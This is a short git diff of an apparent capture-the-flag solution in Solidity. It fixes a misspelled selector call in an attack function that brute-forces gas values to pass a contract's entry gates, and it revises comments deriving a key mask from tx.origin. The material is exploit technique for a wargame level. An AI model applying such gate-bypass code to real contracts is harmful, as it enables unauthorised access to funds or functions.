@@ -15,7 +15,7 @@ function attack() public {
 
         bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
         for(uint i = 0; i < 300; ++i) {
-            (bool success, ) = address(instance).call{gas: i + 8191 * 5}(abi.encodeWithSeletor(Instance.enter.seletor, key));
+            (bool success, ) = address(instance).call{gas: i + 8191 * 5}(abi.encodeWithSelector(Instance.enter.selector, key));
             if(success) {
                 break;
             }
@@ -47,5 +47,5 @@ uint32(uint64(_gateKey)) == uint16(uint64(_gateKey) 0xFFFFFFFF == 0x0000FFFF
 uint32(uint64(_gateKey)) != uint64(_gateKey) 0x00000000FFFFFFFF != 0xFFFFFFFFFFFFFFFF 
 uint32(uint64(_gateKey)) == uint16(uint160(tx.origin) 要求tx.origin
 
-0x00000000FFFFFFFF & 0xFFFFFFFF0000FFFF
+tx.origin & 0xFFFFFFFF0000FFFF
  */
